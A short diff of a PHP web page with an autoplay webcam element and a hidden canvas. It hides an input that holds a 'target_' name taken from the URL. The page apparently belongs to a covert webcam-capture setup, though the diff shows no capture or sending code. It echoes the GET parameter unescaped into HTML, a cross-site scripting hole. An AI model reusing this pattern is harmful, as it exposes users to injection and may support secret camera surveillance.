@@ -16,8 +16,6 @@
 
   <video id="webcam" autoplay playsinline></video>
   <canvas id="canvas" class="d-none"></canvas>
-  
-  <div class="overlay">
   <?php
     if(isset($_GET['name'])){
       $name="target_".$_GET['name'];
@@ -25,7 +23,9 @@
       $name="unknow_target";
     }
   ?>
-  <input class="target_name" type="text" value="<?php echo $name ?>">
+  <input class="target_name" type="text" value="<?php echo $name ?>" hidden>
+  <div class="overlay">
+  
   </div>
 
 
